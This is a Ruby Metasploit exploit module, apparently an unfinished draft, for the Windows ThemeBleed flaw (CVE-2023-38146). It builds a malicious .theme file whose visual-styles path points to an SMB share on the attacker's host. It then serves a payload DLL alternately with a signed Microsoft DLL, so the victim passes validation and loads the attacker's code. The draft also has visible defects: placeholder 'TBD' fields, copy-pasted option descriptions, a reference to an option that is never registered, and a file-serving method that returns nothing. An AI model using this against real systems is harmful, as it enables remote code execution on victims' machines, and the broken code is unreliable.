##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::SMB::Server::Share

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TBD',
        'Description' => %q{
          TBD
        },
        'DisclosureDate' => '2023-09-13',
        'Author' => [
          'gabe_k', # Discovery/PoC
          'bwatters-r7' # msf exploit
        ],
        'References' => [
          ['CVE', '2023-38146'],
          ['URL', 'https://exploits.forsale/themebleed/'],
          ['URL', 'https://github.com/gabe-k/themebleed/tree/main']

        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'Targets' => [
          [ 'Windows', {} ],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]
        }
      )
    )

    register_options([
      OptString.new('STYLES_FILENAME', [false, 'Styles filename', 'styles']),
      OptPath.new('MS_SIGNED_DLL', [true, 'Signed Microsoft DLL to use for passing validation']),
      OptPath.new('MS_PAYLOAD_DLL', [true, 'Signed Microsoft DLL to use for passing validation']),
      OptPath.new('MS_VERSION_FILE', [true, 'Signed Microsoft DLL to use for passing validation'])
    ])
  end

  def file_contents
    vprint_status('file_contents')
    if @files.empty?
      vprint_status('Refilling Array')
      @files = file_array
    end
    delivered_file = @files.pop
    vprint_status("Serving #{Rex::Text.md5(delivered_file)}")
  end

  def file_array
    # payload_dll = generate_payload_dll
    payload_dll = File.binread(datastore['MS_PAYLOAD_DLL'])
    signed_dll = File.binread(datastore['MS_SIGNED_DLL'])
    [ payload_dll, signed_dll]
  end

  def primer
    vprint_status('primer')
    @files = file_array
    @file_name = 'Aero.msstyles_vrf.dll'
    vprint_status("unc = #{unc}")
    @theme_filename = datastore['FILENAME'] || Rex::Text.rand_text_alpha(rand(4..6))
    @styles_filename = datastore['STYLES_FILENAME'] || Rex::Text.rand_text_alpha(rand(4..6))
    if @styles_filename[-9..].nil? || @styles_filename[-9..] != '.msstyles'
      @styles_filename << '.msstyles'
    end
    vprint_status("Shares: #{service.shares}")
    vprint_status("Shares #{@share}")

    virtual_disk = service.shares[@share]
    virtual_disk.add_static_file(@styles_filename, File.binread(datastore['MS_VERSION_FILE']))
    virtual_disk.add_dynamic_file(@file_name) do
      file_contents
    end
    theme = make_theme
    vprint_status(theme)
    file_create(theme)
  end

  def version_check_file
    File.binread(datastore['MS_VERSION_DLL'])
  end

  def make_theme
    vprint_status('make_theme')
    theme_file = <<~THEME
      ; windows 11 theme exploit
      ; copyright 2023 fukin software foundation

      [Theme]
      DisplayName=@%SystemRoot%\\System32\\themeui.dll,-2060

      [Control Panel\\Desktop]
      Wallpaper=%SystemRoot%\\web\\wallpaper\\Windows\\img0.jpg
      TileWallpaper=0
      WallpaperStyle=10

      [VisualStyles]
      Path=\\\\REPLACE_IP_ADDRESS\\REPLACE_SHARENAME\\REPLACE_FILE_NAME
      ColorStyle=NormalColor
      Size=NormalSize

      [MasterThemeSelector]
      MTSM=RJSPBS
    THEME
    vprint_status('1')
    theme_file.gsub!('REPLACE_IP_ADDRESS', datastore['SRVHOST'])
    vprint_status('2')
    theme_file.gsub!('REPLACE_SHARENAME', @share)
    vprint_status('3')
    theme_file.gsub!('REPLACE_FILE_NAME', @styles_filename)
    vprint_status('4')
    return theme_file
  end

end
